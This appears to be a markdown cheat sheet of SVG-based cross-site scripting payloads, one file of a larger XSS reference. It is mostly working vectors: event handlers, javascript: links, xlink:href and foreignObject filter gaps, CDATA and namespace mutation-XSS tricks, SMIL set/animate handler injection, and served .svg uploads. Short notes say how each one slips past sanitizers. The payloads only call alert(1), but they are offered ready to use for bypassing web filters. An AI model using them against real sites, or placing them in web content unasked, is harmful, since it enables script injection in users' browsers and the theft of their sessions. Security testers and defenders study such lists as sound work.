# SVG-deep — the vector that does more than `onload`

SVG is a markup language with its own script/event rules — inside
`<svg>` the HTML parser switches to foreign-content mode. Different
tag names, different case-sensitivity, extra vectors.

---

## 1. The firing-tag inventory — SVG context

```xml
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><a href=javascript:alert(1)><text>x</text></a></svg>
<svg><a xlink:href=javascript:alert(1)><rect width=100 height=100/></a></svg>
<svg><image href=x onerror=alert(1)></svg>
<svg><image xlink:href=x onerror=alert(1)></svg>
<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"></use></svg>
<svg><set attributeName=onmouseover to=alert(1)>
<svg><animate attributeName=href values="javascript:alert(1)">
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc></svg>
```

`onload` on the `<svg>` element itself — no child needed, fires on
parse. `<image>` is the SVG `<img>` — needs `href` or `xlink:href`.

---

## 2. The script element — SVG's own `<script>`

```xml
<svg><script>alert(1)</script></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
<svg><script href="data:text/javascript,alert(1)"/></svg>
<svg><script xlink:href="data:text/javascript,alert(1)"/></svg>
```

Inside `<svg>` the `<script>` element is SVG-script — it runs.
Unlike HTML innerHTML's no-script rule, an svg `<script>` written
via innerHTML ALSO doesn't run (the innerHTML parser keeps the same
rules). But svg `<a href=javascript:>` works, and handlers work.

---

## 3. The `xlink:href` — namespaced attribute

```xml
<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>
<svg><image xlink:href="x" onerror="alert(1)"/></svg>
<svg><use xlink:href="#x"></use><script>alert(1)</script></svg>
```

`xlink:` is the legacy namespace — `href` (no prefix) is the modern
form. Filters checking `href=` but not `xlink:href=` are the gap.

---

## 4. The `foreignObject` escape — back to HTML

```xml
<svg><foreignObject>
  <img src=x onerror=alert(1)>
  <script>alert(1)</script>          -- doesn't run inside fo innerHTML
  <iframe src=javascript:alert(1)>
</foreignObject></svg>
```

Inside `foreignObject` the parser is BACK to HTML rules — the
context inside `foreignObject` is a full HTML context, useful for
bypasses that need HTML semantics inside an SVG-allowed field.

---

## 5. The `<desc>`/`<title>` raw-text traps — CDATA mutations

```xml
<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc></svg>
   -- inside desc/title the parser is in RCDATA — CDATA lets you
      embed a </desc> that closes the element early — the img
      escapes the raw-text prison
```

mXSS territory — the CDATA-delimited `</desc>` tricks the sanitizer
into thinking the img is inside the desc. `mutation-xss.md` §5.

---

## 6. The `use` element — reference injection

```xml
<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>
<svg><use href="x.svg#icon"></use></svg>
```

`use` clones a referenced element — a `use` pointing at a data-URI
svg or an external file's `#id` can carry handlers into the DOM.

---

## 7. SMIL animations — `<animate>`/`<set>` on event attrs

```xml
<svg>
  <set attributeName="onmouseover" to="alert(1)"/>
</svg>
<svg>
  <animate attributeName="onload" to="alert(1)" begin="0s"/>
</svg>
```

`<set>` CAN set event-handler attributes — an svg with no `on*`
attr directly, but `set` WRITES the handler at runtime. The
sanitizer sees `set`/`animate` as safe animation elements.

---

## 8. The file-upload variant — `.svg` files

A `.svg` file uploaded and served as `image/svg+xml` — when opened
directly (a-tag, iframe, object, embed) the whole thing is an XML
document that CAN run scripts. The full vectors in `upload-xss.md`.

The serving-type gate:
- `image/svg+xml` + direct nav → script runs
- `image/svg+xml` + `<img src>` → script NEVER runs
- `text/plain` or `octet-stream` → dead

---

## 9. The entity/namespace confusion — mXSS inside svg

```xml
<svg><style><img src=x onerror=alert(1)></style></svg>
   -- <style> inside svg is raw-text — but mXSS can escape it

<svg><math><mtext><img src=x onerror=alert(1)></mtext></math></svg>
   -- nested foreign-content — mtext inside math inside svg
   -- each namespace switch resets parsing rules
```

The math-inside-svg / svg-inside-math combinations are the mXSS
goldmine — every namespace transition is a parse-boundary the
sanitizer might get wrong. `mutation-xss.md` covers it.

---

## 10. The `<handler>`/`<listener>` — XML-events spec

```xml
<svg xmlns:ev="http://www.w3.org/2001/xml-events">
  <ev:listener event="load" handler="#x"/>
  <handler id="x">alert(1)</handler>
</svg>
```

XML-events is dead in browsers — listed for completeness; use
`onload`/`set`/`script` instead.
